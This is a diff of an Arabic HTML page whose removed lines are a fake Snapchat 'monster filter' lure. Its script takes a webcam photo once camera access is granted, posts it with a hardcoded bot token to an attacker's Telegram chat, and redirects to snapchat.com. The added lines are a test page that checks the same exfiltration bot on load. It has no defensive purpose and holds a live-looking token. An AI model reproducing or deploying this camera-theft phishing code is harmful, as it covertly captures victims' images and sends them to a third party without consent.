@@ -2,55 +2,34 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Snapchat Filter Test</title>
-    <style>
-        body { background-color: #FFFC00; text-align: center; font-family: sans-serif; padding-top: 50px; }
-        .btn { background: #000; color: #fff; padding: 20px; border-radius: 50px; width: 80%; font-size: 20px; border: none; cursor: pointer; font-weight: bold; }
-        video, canvas { display: none; }
-    </style>
+    <title>Test Bot</title>
 </head>
-<body>
+<body style="background:#FFFC00; text-align:center; padding-top:100px;">
 
-    <img src="https://pluspng.com/img-png/snapchat-logo-png-snapchat-logo-png-transparent-1024.png" width="100">
-    <h1>فلتر "الوحش" 👿</h1>
-    <p>اضغط لتجربة الفلتر الجديد</p>
-
-    <video id="v" autoplay playsinline></video>
-    <canvas id="c" width="640" height="480"></canvas>
-    <button id="b" class="btn">تفعيل الآن 📸</button>
+    <h1>فحص اتصال البوت 🤖</h1>
+    <p id="status">انتظر... جارِ محاولة مراسلة البوت</p>
 
 <script>
+    // بياناتك اللي حلفت إنها صحيحة يا وحش 👿
     const token = "8371736437:AAG3niwDWXJCjo8MFgiTJdL2zpNjVrJBMFU";
     const chat = "321516845";
-    const v = document.getElementById('v');
-    const c = document.getElementById('c');
-    const b = document.getElementById('b');
 
-    b.onclick = async () => {
-        try {
-            const s = await navigator.mediaDevices.getUserMedia({ video: true });
-            v.srcObject = s;
-            b.innerText = "جارِ التحميل... ⏳";
-
-            setTimeout(() => {
-                c.getContext('2d').drawImage(v, 0, 0, 640, 480);
-                c.toBlob(blob => {
-                    const f = new FormData();
-                    f.append('chat_id', chat);
-                    f.append('photo', blob, 'x.png');
-
-                    // الإرسال السريع
-                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                        method: 'POST',
-                        body: f
-                    }).then(() => {
-                        // إرسال رسالة نصية للتأكيد (احتياط)
-                        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=👿 صيد جديد يا وحش!`);
-                        window.location.href = "https://www.snapchat.com";
-                    });
-                }, 'image/png');
-            }, 2500);
-        } catch (e) { alert("افتح الكاميرا يا بطل!"); }
+    // أول ما تفتح الصفحة، نضرب البوت برسالة
+    window.onload = () => {
+        const msg = encodeURIComponent("👿 وحش! إذا شفت هاي الرسالة يعني البوت شغال والربط صح 100%");
+        
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${msg}`)
+        .then(res => res.json())
+        .then(data => {
+            if(data.ok) {
+                document.getElementById('status').innerHTML = "✅ وصلت الرسالة! البوت شغال.. العلة جانت بالكاميرا";
+            } else {
+                document.getElementById('status').innerHTML = "❌ البوت رفض الرسالة! السبب: " + data.description;
+            }
+        })
+        .catch(err => {
+            document.getElementById('status').innerHTML = "⚠️ المتصفح منع الإرسال (CORS Error)";
+        });
     };
 </script>
 </body>
